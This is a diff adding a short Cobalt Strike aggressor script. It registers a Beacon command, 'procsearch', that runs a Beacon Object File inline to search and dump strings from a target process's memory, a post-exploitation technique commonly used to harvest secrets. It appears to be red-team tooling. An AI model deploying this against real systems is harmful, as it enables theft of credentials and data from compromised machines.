@@ -1,0 +1,22 @@
+alias procsearch {
+	
+    local('$1 $pid $searchString');
+    
+    ($1, $pid, $searchString) = @_;
+	
+    if (size(@_) != 3)
+    {
+        berror($1, "Usage : procsearch <pid> <searchString>");
+		return;
+    }
+	
+    $handle = openf(script_resource("procsearch-BOF.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($1 , "iz", $pid, $searchString);
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register("procsearch", "Dump searchable strings from process memory", "Synopsis: procsearch <pid> <searchString>");
